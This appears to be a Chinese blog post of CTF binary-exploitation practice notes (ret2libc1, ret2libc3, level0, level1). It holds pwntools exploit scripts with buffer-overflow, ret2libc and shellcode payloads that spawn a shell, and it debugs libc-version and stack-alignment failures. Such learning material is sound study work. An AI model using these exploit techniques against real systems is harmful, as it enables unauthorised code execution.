@@ -1,0 +1,539 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Some Problems - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Some Problems">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-30 00:00" pubdate>
+        2022年5月30日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Some Problems</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Some-Problems"><a href="#Some-Problems" class="headerlink" title="Some Problems"></a>Some Problems</h1><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>io.recv()<br><br><span class="hljs-comment">#system_plt = 0x08048460</span><br><span class="hljs-comment">#bin_sh = 0x08048720</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-number">0xdeadbeef</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<p>报错：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">ROP$</span><span class="bash"> python3 exp4.py</span><br>[+] Starting local process &#x27;./ret2libc1&#x27;: pid 6683<br>[*] &#x27;/home/pwn/桌面/题目/ROP/ret2libc1&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>0x8048720<br>[*] Switching to interactive mode<br>[*] Got EOF while reading in interactive<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[*] Process &#x27;./ret2libc1&#x27; stopped with exit code -11 (SIGSEGV) (pid 6683)<br>[*] Got EOF while sending in interactive<br></code></pre></td></tr></table></figure>
+<p><code>python</code> 中的函数 <code>hex()</code> 返回16进制数，以字符串形式表示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>a = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(a)			<span class="hljs-comment">#134504882</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))		<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br><br>b = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br><span class="hljs-built_in">print</span>(b)			<span class="hljs-comment">#0x80461b2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(b))		<span class="hljs-comment">#&lt;class &#x27;str&#x27;&gt;</span><br><br>c = <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(c)			<span class="hljs-comment">#16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-number">0x10</span>))	<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><code>libc</code> 版本不一致，导致打不通。</p>
+<blockquote>
+<p>本地：<code>libc-2.31.so</code> ，远端：<code>libc-2.23.so</code> ）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&#x27; : &#x27;</span>)<br>libcbase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_got = libcbase + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>payload = flat([cyclic(<span class="hljs-number">60</span>), system_got, <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))])<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="加载指定libc版本"><a href="#加载指定libc版本" class="headerlink" title="加载指定libc版本"></a>加载指定libc版本</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>让程序强行加载特定版本 <code>glibc</code>，通过 <code>LD_LIBRARY_PATH</code> 或者 <code>LD_PRELOAD</code> 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br></code></pre></td></tr></table></figure>
+<p>因为 <code>ld.so</code> 和 <code>libc.so</code> 不匹配的原因，如果版本差太远可能行不通。可以将配套的 <code>ld</code> 和 <code>libc</code> 一起使用即可实现动态加载 <code>libc</code> 。</p>
+<p>在 <code>pwntools</code> 启动程序时，可以按照下面的代码进行设置。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">io = process([&quot;/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2&quot;, &quot;./ret2libc3&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)<br></code></pre></td></tr></table></figure>
+<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>用 <code>patchelf</code> 和 <code>glibc-all-in-one</code> 来解决这个问题。</p>
+<h4 id="GitHub-地址"><a href="#GitHub-地址" class="headerlink" title="GitHub 地址"></a>GitHub 地址</h4><p>patchelf：<a target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p>
+<p>glibc-all-in_one：<a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
+<h4 id="libc-下载"><a href="#libc-下载" class="headerlink" title="libc 下载"></a>libc 下载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> glibc-all-in-one</span><br><span class="hljs-meta">$</span><span class="bash"> ./update_list						<span class="hljs-comment">#更新最新版本的 glibc 目录</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list 							<span class="hljs-comment">#查看可下载的 glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.3_i386	<span class="hljs-comment">#下载想要的 glibc</span></span><br></code></pre></td></tr></table></figure>
+<p>更多说明请进入 github 查看：<a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
+<h4 id="更改-elf-文件的-ld-和-libc"><a href="#更改-elf-文件的-ld-和-libc" class="headerlink" title="更改 elf 文件的 ld 和 libc"></a>更改 elf 文件的 ld 和 libc</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span> <br>	linux-gate.so.1 (0xf7fa6000)<br>	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7da1000)<br>	/lib/ld-linux.so.2 (0xf7fa7000)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so ret2libc3</span>       <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span>     <br>	linux-gate.so.1 (0xf7f71000)<br>	/home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so (0xf7db8000)<br>	/lib/ld-linux.so.2 (0xf7f72000)<br><span class="hljs-meta">	</span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2</span> <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span><br>	linux-gate.so.1 (0xf7f59000)<br>	/home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so (0xf7da0000)<br>	/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0xf7f5a000)<br></code></pre></td></tr></table></figure>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;World\n&#x27;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<p>栈对齐导致 exp 打不通。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvline()<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>ret = <span class="hljs-number">0x00400431</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(ret) + p64(callsys_addr)<br><span class="hljs-comment"># callsys_addr = 0x00400597/A</span><br><span class="hljs-comment"># payload = b&#x27;A&#x27; * (0x80 + 0x8) + p64(callsys_addr)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">00:0000│ rsi rsp  0x7fffffffded0 ◂— &#x27;AAAAAAAA\n&#x27;<br>01:0008│          0x7fffffffded8 ◂— 0xa /* &#x27;\n&#x27; */<br>02:0010│          0x7fffffffdee0 ◂— 0x0<br>... ↓<br>08:0040│          0x7fffffffdf10 —▸ 0x400040 ◂— 0x500000006<br>09:0048│          0x7fffffffdf18 ◂— 0xf0b5ff<br>0a:0050│          0x7fffffffdf20 ◂— 0xc2<br>0b:0058│          0x7fffffffdf28 —▸ 0x7fffffffdf57 ◂— 0x4005f300<br>0c:0060│          0x7fffffffdf30 ◂— 0x1<br>0d:0068│          0x7fffffffdf38 —▸ 0x40064d (__libc_csu_init+77) ◂— add    rbx, 1<br>0e:0070│          0x7fffffffdf40 —▸ 0x400600 (__libc_csu_init) ◂— push   r15<br>0f:0078│          0x7fffffffdf48 —▸ 0x7ffff7ffe190 ◂— 0x0<br>10:0080│ rbp      0x7fffffffdf50 —▸ 0x7fffffffdf70 ◂— 0x0<br>11:0088│          0x7fffffffdf58 —▸ 0x4005f3 (main+45) ◂— leave<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = gdb.debug(<span class="hljs-string">&quot;./level0&quot;</span>,<span class="hljs-string">&quot;b *0x0040059A&quot;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">───────────────────────────────[ DISASM]──────────────────────────────────────<br> ► <span class="hljs-number">0x7fb830d3ffbc</span> &lt;do_system+<span class="hljs-number">364</span>&gt;    <span class="hljs-keyword">movaps</span> xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x50</span>], <span class="hljs-built_in">xmm0</span><br>   <span class="hljs-number">0x7fb830d3ffc1</span> &lt;do_system+<span class="hljs-number">369</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">0</span><br>   <span class="hljs-number">0x7fb830d3ffca</span> &lt;do_system+<span class="hljs-number">378</span>&gt;    <span class="hljs-keyword">call</span>   posix_spawn &lt;posix_spawn&gt;<br></code></pre></td></tr></table></figure>
+<p>得知 <code>glibc2.27</code> 以后引入 <code>xmm寄存器</code> ，记录程序状态，会执行 movaps 指令，要求 rsp 是按 16字节对齐的 。</p>
+<p>是 xmm寄存器的问题，当 glibc 版本大于 2.27 的时候，系统调用 <code>system(&quot;/bin/sh&quot;)</code> 之前有个 xmm 寄存器使用。要确保 rsp 是与 16 对齐的，也就是末尾必须是 0 。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">关于jarvisOJ level0远程打得通本地打不通的问题_fjh1997的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42016744/article/details/122422452">pwn system(“/bin/sh“)失败的原因 flypwn的博客-CSDN博客_system(/bin/sh)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rookle/p/12871878.html">在一些64位的glibc的payload调用system函数失败问题 - Rookle - 博客园 (cnblogs.com)</a></p>
+<h2 id="栈的对齐问题"><a href="#栈的对齐问题" class="headerlink" title="栈的对齐问题"></a>栈的对齐问题</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tcctw/article/details/106827439">x86_64 Linux 运行时栈的字节对齐_tcctw的博客-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29328443/article/details/107232025">x86<em>64汇编之四：函数调用、调用约定 ponnylv的博客-CSDN博客</em>汇编调用函数</a></p>
+</blockquote>
+<p>其实，栈的对齐问题来源于上述文档中的一段话：</p>
+<blockquote>
+<p>In addition to registers, each function has a frame on the run-time stack. This stack grows downwards from high addresses. Figure 3.3 shows the stack organization. <strong>The end of the input argument area shall be aligned on a 16</strong> (32 or 64, if <strong>m256 or </strong>m512 is passed on stack) <strong>byte boundary</strong>. In other words, <strong>the value (%rsp + 8) is always a multiple of 16</strong> (32 or 64) <strong>when control is transferred to the function entry point.</strong> The stack pointer, %rsp, always points to the end of the latest allocated stack frame.</p>
+</blockquote>
+<p>System V AMD64 调用约定要求栈必须按16字节对齐，也就是说，在调用call指令之前（the end of the input argument area），%rsp指针必须是16的倍数（对应16进制是最后1位是0）。按16字节对齐的原因是，现代 x86_64 计算机引入了 SSE 和 AVX 指令，这些指令支持 SIMD，能极大提升处理速度。但是这些指令要求必须从16字节的整数倍的地址处取数据，为了顾及这些指令，才有了上述对齐要求。</p>
+<p>上面这段文档第二句为什么又说是 %rsp + 8 必须是16的倍数呢？实际上，它说的%rsp是执行完 call 指令之后的 %rsp，执行 call 指令会导致栈中压入一个8个字节的返回地址。原来 %rsp 是按16字节对齐的，压入8字节地址后，显然是 %rsp + 8 才是16的倍数。</p>
+<p>此外，在该调用约定下，函数的起始地址始终是按8字节对齐的（misaligned by 8 bytes），即起始地址是8的倍数。（至于为什么函数起始地址是8字节对齐没大看懂）。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://stackoverflow.com/a/56066628/6570986">https://stackoverflow.com/a/56066628/6570986</a></p>
+<p>总结一下，函数起始地址按8字节对齐和栈按16字节对齐 这两点是我们在编写汇编代码时需要注意的，如果不注意，就会编写出错误的代码。</p>
+<p>更多关于栈的对齐，可以参考：</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack">https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack</a><br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler">https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler</a><br><a target="_blank" rel="noopener" href="https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/">https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/</a></p>
+<h2 id="解决一种pwn本地打不通远程打得通的问题"><a href="#解决一种pwn本地打不通远程打得通的问题" class="headerlink" title="解决一种pwn本地打不通远程打得通的问题"></a>解决一种pwn本地打不通远程打得通的问题</h2><blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/105347161">https://blog.csdn.net/fjh1997/article/details/105347161</a></p>
+</blockquote>
+<p>最近就遇到了这样的怪题目，本地劫持指针到 <code>execve()</code> 的 <code>int 80</code> 系统调用的时候，本地会卡住，远程却可以，我的建立的 <code>shellcode</code> 是这样的：</p>
+<pre><code>push 0x68
+push 0x732f2f2f
+push 0x6e69622f
+mov ebx, esp
+xor ecx, ecx
+push 0x8
+pop eax
+inc eax
+inc eax
+inc eax
+int 0x80
+</code></pre><p>之后调试的时候发现，int 调用的时候 envp 参数有点奇怪，本来应该是 0，现在却是 The_Pursuit_of_happiness</p>
+<p>这个时候才想起来我 envp 没有清空，也就是少了一条 <code>xor edx,edx</code> 指令，之后加上去后本地就能打通 。</p>
+<pre><code>push 0x68
+push 0x732f2f2f
+push 0x6e69622f
+mov ebx, esp
+xor ecx, ecx
+xor edx,edx
+push 0x8
+pop eax
+inc eax
+inc eax
+inc eax
+int 0x80
+</code></pre><p>综上所述 pwn 本地打不通远程打通的问题原因之一是由于环境变量指针不一样，远程的环境变量指针可能恰好符合这个程序，而本地的不符合，所以要清 0。所以要按照 envp=0 调用 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(path=<span class="hljs-string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="hljs-string">&#x27;sh&#x27;</span>], envp=<span class="hljs-number">0</span>) <br></code></pre></td></tr></table></figure>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>io = gdb.debug(<span class="hljs-string">&quot;./level1&quot;</span>,<span class="hljs-string">&quot;b *0x080484B6&quot;</span>)<br><span class="hljs-comment">#io = process(&#x27;./level1&#x27;)</span><br>text = io.recvline()[<span class="hljs-number">14</span>: -<span class="hljs-number">2</span>]<br>buf_addr = <span class="hljs-built_in">int</span>(text, <span class="hljs-number">16</span>)<br><br>payload = shellcode + <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span> - <span class="hljs-built_in">len</span>(shellcode)) + p32(buf_addr)<br><span class="hljs-comment"># payload = b&#x27;\x90&#x27; * (0x88 + 0x4 - len(shellcode)) + shellcode + p32(buf_addr)		# 打不通</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
